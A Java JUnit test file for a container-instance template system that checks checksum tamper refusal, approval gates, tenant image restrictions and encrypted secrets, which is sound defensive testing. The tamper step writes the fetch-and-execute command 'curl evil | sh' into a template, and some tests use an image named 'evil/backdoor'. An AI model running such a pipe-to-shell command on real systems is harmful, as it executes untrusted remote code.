package be.elevenways.hohenheim.test.instance;

import be.elevenways.hohenheim.model.InstanceModel;
import be.elevenways.hohenheim.model.InstanceTemplateFileModel;
import be.elevenways.hohenheim.model.InstanceTemplateModel;
import be.elevenways.hohenheim.model.InstanceTemplateVariableModel;
import be.elevenways.hohenheim.model.InstanceVariableModel;
import be.elevenways.hohenheim.server.HohenheimDatabase;
import be.elevenways.hohenheim.server.auth.HohenheimAccess;
import be.elevenways.hohenheim.server.instance.InstanceService;
import be.elevenways.hohenheim.server.instance.InstanceTemplates;
import be.elevenways.hohenheim.server.instance.TemplatePortability;
import be.elevenways.hohenheim.test.HohenheimTestBase;
import be.elevenways.hohenheim.test.TenantConduits;
import be.elevenways.zenit.auth.model.UserModel;
import be.elevenways.zenit.auth.model.UserPrincipal;
import be.elevenways.zenit.auth.server.AuthModels;
import be.elevenways.zenit.auth.server.RecordGrants;
import be.elevenways.zenit.common.orm.datasource.Row;
import be.elevenways.zenit.common.orm.model.Model;
import be.elevenways.zenit.common.orm.model.Models;
import be.elevenways.zenit.common.validation.Violations;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;

import java.time.Instant;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.catchThrowable;

/**
 * The template tier's policy half, no daemon needed: checksummed export/import round
 * trip with tamper refusal, the operator-approval gate, the image_any write-funnel
 * gate for tenant-originated writes, typed variable validation on the create-from-
 * template path (with the secret encrypted AT REST), and the install-state deploy gate.
 */
class InstanceTemplatePolicyTest extends HohenheimTestBase {

    private static final String PREFIX = "tpl-policy-";

    private static Integer tenantId;
    private static UserPrincipal tenantPrincipal;
    private static UserPrincipal adminPrincipal;

    @BeforeAll
    static void seedActors() {
        Row tenant = AuthModels.users().createEmptyRow();
        tenant.set(UserModel.EMAIL, "tpl-tenant@hohenheim.local");
        tenant.set(UserModel.DISPLAY_NAME, "Template Tenant");
        tenant.set(UserModel.ENABLED, true);
        tenant.set(UserModel.CREATED_AT, Instant.now());
        tenant.set(UserModel.UPDATED_AT, Instant.now());
        AuthModels.users().save(tenant);
        tenantId = tenant.get(UserModel.ID);
        tenantPrincipal = new UserPrincipal(tenantId, "Template Tenant");

        Row admin = AuthModels.users().find()
            .where(UserModel.EMAIL.eq("test@hohenheim.local")).first();
        adminPrincipal = new UserPrincipal(admin.get(UserModel.ID), "Test Admin");
    }

    @AfterAll
    static void cleanUp() {
        Model instances = Models.get(InstanceModel.class);
        for (Row row : instances.find().where(InstanceModel.NAME.startsWith(PREFIX)).all()) {
            for (Row variable : Models.get(InstanceVariableModel.class)
                    .findByInstanceId(row.get(InstanceModel.ID))) {
                Models.get(InstanceVariableModel.class)
                    .delete(variable.get(InstanceVariableModel.ID));
            }
            instances.delete(row.get(InstanceModel.ID));
        }
        Model templates = Models.get(InstanceTemplateModel.class);
        for (Row row : templates.find().where(InstanceTemplateModel.NAME.startsWith(PREFIX)).all()) {
            int templateId = row.get(InstanceTemplateModel.ID);
            for (Row variable : Models.get(InstanceTemplateVariableModel.class)
                    .findByTemplateId(templateId)) {
                Models.get(InstanceTemplateVariableModel.class)
                    .delete(variable.get(InstanceTemplateVariableModel.ID));
            }
            for (Row file : Models.get(InstanceTemplateFileModel.class)
                    .findByTemplateId(templateId)) {
                Models.get(InstanceTemplateFileModel.class)
                    .delete(file.get(InstanceTemplateFileModel.ID));
            }
            templates.delete(templateId);
        }
    }

    // -- fixtures -------------------------------------------------------------

    private static int template(String name, boolean approved, Map<String, Object> settings) {
        Model templates = Models.get(InstanceTemplateModel.class);
        Row row = templates.createEmptyRow();
        row.set(InstanceTemplateModel.NAME, name);
        row.set(InstanceTemplateModel.KIND, "hohenheim:docker_container");
        row.set(InstanceTemplateModel.SETTINGS, settings);
        if (approved) {
            row.set(InstanceTemplateModel.APPROVED_AT, Instant.now());
            row.set(InstanceTemplateModel.APPROVED_BY_USER_ID, 1L);
        }
        templates.save(row);
        return row.get(InstanceTemplateModel.ID);
    }

    private static void variable(int templateId, String key, String type, boolean required,
                                 String defaultValue, Map<String, Object> settings) {
        Model variables = Models.get(InstanceTemplateVariableModel.class);
        Row row = variables.createEmptyRow();
        row.set(InstanceTemplateVariableModel.TEMPLATE_ID, templateId);
        row.set(InstanceTemplateVariableModel.KEY, key);
        row.set(InstanceTemplateVariableModel.TYPE, type);
        row.set(InstanceTemplateVariableModel.REQUIRED, required);
        row.set(InstanceTemplateVariableModel.DEFAULT_VALUE, defaultValue);
        row.set(InstanceTemplateVariableModel.SETTINGS, settings);
        variables.save(row);
    }

    private static Map<String, Object> alpineSettings() {
        Map<String, Object> settings = new LinkedHashMap<>();
        settings.put("image", "alpine");
        settings.put("tag", "latest");
        settings.put("command", "sleep 300");
        return settings;
    }

    private static String violationKeys(Throwable thrown) {
        assertThat(thrown).isInstanceOf(Violations.class);
        StringBuilder keys = new StringBuilder();
        for (var violation : ((Violations) thrown).all()) {
            keys.append(violation.fieldName()).append('=')
                .append(violation.message().key()).append(' ');
        }
        return keys.toString();
    }

    // -- the journeys ---------------------------------------------------------

    @Test
    void exportImportRoundTripVerifiesChecksumAndLandsUnapproved() {
        // 1. A full template: settings, install step, matcher fields, variables, a file.
        int templateId = template(PREFIX + "export-src", true, alpineSettings());
        Row source = Models.get(InstanceTemplateModel.class).findById(templateId);
        source.set(InstanceTemplateModel.DESCRIPTION, "Round-trip fixture");
        source.set(InstanceTemplateModel.VERSION, 3);
        source.set(InstanceTemplateModel.INSTALL_IMAGE, "alpine");
        source.set(InstanceTemplateModel.INSTALL_SCRIPT, "echo install >> /data/runs");
        source.set(InstanceTemplateModel.REINSTALL_POLICY, InstanceTemplateModel.REINSTALL_CLEAR);
        source.set(InstanceTemplateModel.READINESS_LINE, "Done (");
        source.set(InstanceTemplateModel.STOP_COMMAND, "stop");
        Models.get(InstanceTemplateModel.class).save(source);
        variable(templateId, "SERVER_PORT", "hohenheim:integer", true, "25565",
            Map.of("min", 1024, "max", 65535));
        variable(templateId, "FORWARDING_SECRET", "hohenheim:secret", true, "",
            Map.of("generate", true, "generate_bytes", 32));
        Row file = Models.get(InstanceTemplateFileModel.class).createEmptyRow();
        file.set(InstanceTemplateFileModel.TEMPLATE_ID, templateId);
        file.set(InstanceTemplateFileModel.CONTAINER_PATH, "/etc/app.conf");
        file.set(InstanceTemplateFileModel.CONTENT, "port={{SERVER_PORT}}\nsecret={{FORWARDING_SECRET}}\n");
        file.set(InstanceTemplateFileModel.MODE, "0600");
        Models.get(InstanceTemplateFileModel.class).save(file);

        // 2. Export: a self-identifying, checksummed document.
        String document = new TemplatePortability().export(
            Models.get(InstanceTemplateModel.class).findById(templateId));
        assertThat(document).as("step 2: the document self-identifies")
            .contains("hohenheim-instance-template").contains("sha256");

        // 3. Import: everything round-trips, and the imported template is UNAPPROVED
        //    with its provenance recorded -- regardless of the source being approved.
        int importedId = new TemplatePortability().importDocument(document, PREFIX + "unit");
        Row imported = Models.get(InstanceTemplateModel.class).findById(importedId);
        assertThat((String) imported.get(InstanceTemplateModel.NAME))
            .as("step 3: name round-trips").isEqualTo(PREFIX + "export-src");
        assertThat((Integer) imported.get(InstanceTemplateModel.VERSION))
            .as("step 3: version round-trips").isEqualTo(3);
        assertThat((String) imported.get(InstanceTemplateModel.INSTALL_SCRIPT))
            .as("step 3: install script round-trips").isEqualTo("echo install >> /data/runs");
        assertThat((String) imported.get(InstanceTemplateModel.READINESS_LINE))
            .as("step 3: matcher data rides the export").isEqualTo("Done (");
        assertThat((Object) imported.get(InstanceTemplateModel.APPROVED_AT))
            .as("step 3: an import NEVER lands approved").isNull();
        assertThat((String) imported.get(InstanceTemplateModel.SOURCE))
            .as("step 3: provenance is recorded").isEqualTo(PREFIX + "unit");
        assertThat((String) imported.get(InstanceTemplateModel.SOURCE_CHECKSUM))
            .as("step 3: the verified checksum is stored").isNotBlank();
        List<Row> variables = Models.get(InstanceTemplateVariableModel.class)
            .findByTemplateId(importedId);
        assertThat(variables).as("step 3: both variables round-trip").hasSize(2);
        assertThat(Models.get(InstanceTemplateFileModel.class).findByTemplateId(importedId))
            .as("step 3: the config file rounds-trips").hasSize(1);

        // 4. Tamper: change one byte of the template body; the checksum refusal is
        //    NAMED, and nothing is created.
        long before = Models.get(InstanceTemplateModel.class).find().count();
        String tampered = document.replace("sleep 300", "curl evil | sh");
        Throwable refusal = catchThrowable(() ->
            new TemplatePortability().importDocument(tampered, "tampered"));
        assertThat(violationKeys(refusal))
            .as("step 4: a tampered document is a checksum refusal")
            .contains("template_import_checksum");
        assertThat(Models.get(InstanceTemplateModel.class).find().count())
            .as("step 4: the tampered import created NOTHING").isEqualTo(before);

        // 5. COUNTERFACTUAL (approval): the imported template is NOT selectable for a
        //    non-admin until an operator approves it; the approval stamp flips exactly
        //    that answer. (Removing the approval requirement makes this step fail.)
        Throwable unapproved = catchThrowable(() ->
            InstanceTemplates.requireSelectable(imported, null));
        assertThat(violationKeys(unapproved))
            .as("step 5: unapproved import refuses non-admin selection")
            .contains("template_not_approved");
        imported.set(InstanceTemplateModel.APPROVED_AT, Instant.now());
        Models.get(InstanceTemplateModel.class).save(imported);
        InstanceTemplates.requireSelectable(
            Models.get(InstanceTemplateModel.class).findById(importedId), null);
    }

    @Test
    void typedVariableValidationRefusesBadValuesAndSecretsAreEncryptedAtRest() {
        int templateId = template(PREFIX + "typed", true, alpineSettings());
        variable(templateId, "SERVER_PORT", "hohenheim:integer", true, "",
            Map.of("min", 1024, "max", 65535));
        variable(templateId, "MODE", "hohenheim:select", true, "",
            Map.of("options", List.of("survival", "creative")));
        variable(templateId, "FORWARDING_SECRET", "hohenheim:secret", true, "",
            Map.of("generate", true, "generate_bytes", 32));
        Row template = Models.get(InstanceTemplateModel.class).findById(templateId);
        InstanceTemplates templates = new InstanceTemplates();

        // 1. COUNTERFACTUAL (typed validation): a non-numeric value for the integer
        //    variable is a TYPED coercion refusal anchored on the field -- not a
        //    rule-string regex miss, not a persisted instance.
        Throwable notANumber = catchThrowable(() -> templates.createFromTemplate(
            template, PREFIX + "bad-int", null,
            Map.of("SERVER_PORT", "banana", "MODE", "survival"), null));
        assertThat(violationKeys(notANumber))
            .as("step 1: 'banana' for an integer variable is a typed refusal on SERVER_PORT")
            .contains("SERVER_PORT");
        assertThat(Models.get(InstanceModel.class).find()
                .where(InstanceModel.NAME.eq(PREFIX + "bad-int")).count())
            .as("step 1: the refused create persisted NOTHING").isZero();

        // 2. A numeric value OUTSIDE the declared bounds is a typed Max violation.
        Throwable outOfRange = catchThrowable(() -> templates.createFromTemplate(
            template, PREFIX + "big-int", null,
            Map.of("SERVER_PORT", "70000", "MODE", "survival"), null));
        assertThat(violationKeys(outOfRange))
            .as("step 2: 70000 violates the declared max=65535, as a typed Max violation")
            .contains("SERVER_PORT=zenit.validation.max");

        // 3. A value outside the select's closed set is refused.
        Throwable badChoice = catchThrowable(() -> templates.createFromTemplate(
            template, PREFIX + "bad-mode", null,
            Map.of("SERVER_PORT", "25565", "MODE", "hardcore"), null));
        assertThat(violationKeys(badChoice))
            .as("step 3: a value outside the closed option set is refused on MODE")
            .contains("MODE");

        // 4. Valid values create the instance: variables stored, the blank secret
        //    GENERATED, and the secret's column value is a zenc$ envelope at rest
        //    while the model read still decrypts it.
        int instanceId = templates.createFromTemplate(template, PREFIX + "good", null,
            Map.of("SERVER_PORT", "25565", "MODE", "survival"), null);
        Map<String, String> values = new be.elevenways.hohenheim.server.instance
            .InstanceVariables().valuesFor(instanceId);
        assertThat(values.get("SERVER_PORT"))
            .as("step 4: the integer variable stored its coerced value").isEqualTo("25565");
        assertThat(values.get("FORWARDING_SECRET"))
            .as("step 4: the blank secret was generated").isNotBlank();
        var raw = HohenheimDatabase.datasource().rawQuery(
            "SELECT secret_value AS c FROM instance_variables"
                + " WHERE instance_id = " + instanceId + " AND key = 'FORWARDING_SECRET'");
        String envelope = String.valueOf(raw.get(0).get("c"));
        assertThat(envelope)
            .as("step 4: the secret is CIPHERTEXT at rest (zenc$ envelope)")
            .startsWith("zenc$")
            .doesNotContain(values.get("FORWARDING_SECRET"));

        // 5. The install-state deploy gate: stamp the instance install-pending and
        //    deploy must refuse BEFORE touching any daemon.
        Row instance = Models.get(InstanceModel.class).findById(instanceId);
        instance.set(InstanceModel.INSTALL_STATE, InstanceModel.INSTALL_PENDING);
        Models.get(InstanceModel.class).save(instance);
        Throwable notInstalled = catchThrowable(() -> new InstanceService().deploy(instanceId));
        assertThat(violationKeys(notInstalled))
            .as("step 5: deploy refuses an uninstalled template instance, named")
            .contains("install_incomplete");
    }

    @Test
    void tenantWritesRunApprovedTemplateImagesOrNeedImageAny() {
        int approvedId = template(PREFIX + "approved", true, alpineSettings());
        int unapprovedId = template(PREFIX + "unapproved", false, alpineSettings());
        Row approved = Models.get(InstanceTemplateModel.class).findById(approvedId);
        Model instances = Models.get(InstanceModel.class);

        // 1. COUNTERFACTUAL (image_any): a tenant-originated create with an ARBITRARY
        //    image is refused by the write funnel with the named violation, and no row
        //    persists. (Removing InstanceImagePolicy.install makes this step fail.)
        Throwable arbitrary = catchThrowable(() -> TenantConduits.as(tenantPrincipal, () -> {
            Row row = instances.createEmptyRow();
            row.set(InstanceModel.NAME, PREFIX + "evil");
            row.set(InstanceModel.KIND, "hohenheim:docker_container");
            row.set(InstanceModel.SETTINGS, new LinkedHashMap<>(
                Map.of("image", "evil/backdoor", "tag", "latest")));
            instances.save(row);
        }));
        assertThat(violationKeys(arbitrary))
            .as("step 1: a tenant's arbitrary image is refused, named")
            .contains("image_requires_capability");
        assertThat(instances.find().where(InstanceModel.NAME.eq(PREFIX + "evil")).count())
            .as("step 1: the refused create persisted NOTHING").isZero();

        // 2. The same tenant creating FROM the approved template (its exact image)
        //    passes the funnel: templates are the sanctioned image source.
        int[] created = new int[1];
        TenantConduits.as(tenantPrincipal, () -> {
            Row row = instances.createEmptyRow();
            row.set(InstanceModel.NAME, PREFIX + "from-approved");
            row.set(InstanceModel.KIND, "hohenheim:docker_container");
            row.set(InstanceModel.SETTINGS, new LinkedHashMap<>(alpineSettings()));
            row.set(InstanceModel.TEMPLATE_ID, approvedId);
            instances.save(row);
            created[0] = row.get(InstanceModel.ID);
        });
        assertThat(instances.findById(created[0]))
            .as("step 2: the template-sourced create persisted").isNotNull();

        // 3. An UNAPPROVED template is not an image source for a tenant: pointing
        //    template_id at it does not launder the image in.
        Throwable viaUnapproved = catchThrowable(() -> TenantConduits.as(tenantPrincipal, () -> {
            Row row = instances.createEmptyRow();
            row.set(InstanceModel.NAME, PREFIX + "from-unapproved");
            row.set(InstanceModel.KIND, "hohenheim:docker_container");
            row.set(InstanceModel.SETTINGS, new LinkedHashMap<>(alpineSettings()));
            row.set(InstanceModel.TEMPLATE_ID, unapprovedId);
            instances.save(row);
        }));
        assertThat(violationKeys(viaUnapproved))
            .as("step 3: an unapproved template is refused as an image source")
            .contains("image_requires_capability");

        // 4. A tenant UPDATE that swaps the image away from the template is refused --
        //    but a write that does not touch image facts (a rename) passes untouched.
        TenantConduits.as(tenantPrincipal, () -> {
            Row row = instances.findById(created[0]);
            row.set(InstanceModel.NAME, PREFIX + "renamed");
            instances.save(row);
        });
        Throwable imageSwap = catchThrowable(() -> TenantConduits.as(tenantPrincipal, () -> {
            Row row = instances.findById(created[0]);
            row.set(InstanceModel.SETTINGS, new LinkedHashMap<>(
                Map.of("image", "evil/backdoor", "tag", "latest")));
            instances.save(row);
        }));
        assertThat(violationKeys(imageSwap))
            .as("step 4: swapping to an arbitrary image on update is refused")
            .contains("image_requires_capability");

        // 5. image_any ON THE RECORD is the sanctioned override: with the grant the
        //    same update passes.
        RecordGrants.grant("user", tenantId, InstanceModel.MODEL_ID, created[0],
            HohenheimAccess.IMAGE_ANY, true);
        TenantConduits.as(tenantPrincipal, () -> {
            Row row = instances.findById(created[0]);
            row.set(InstanceModel.SETTINGS, new LinkedHashMap<>(
                Map.of("image", "busybox", "tag", "latest")));
            instances.save(row);
        });
        assertThat((Object) ((Map<?, ?>) instances.findById(created[0])
                .get(InstanceModel.SETTINGS)).get("image"))
            .as("step 5: with image_any the arbitrary image persists").isEqualTo("busybox");

        // 6. An ADMIN write is not tenant-originated: arbitrary images pass.
        TenantConduits.as(adminPrincipal, () -> {
            Row row = instances.createEmptyRow();
            row.set(InstanceModel.NAME, PREFIX + "admin-any");
            row.set(InstanceModel.KIND, "hohenheim:docker_container");
            row.set(InstanceModel.SETTINGS, new LinkedHashMap<>(
                Map.of("image", "internal/tool", "tag", "latest")));
            instances.save(row);
        });
        assertThat(instances.find().where(InstanceModel.NAME.eq(PREFIX + "admin-any")).count())
            .as("step 6: an operator's arbitrary image is allowed").isEqualTo(1);
    }
}
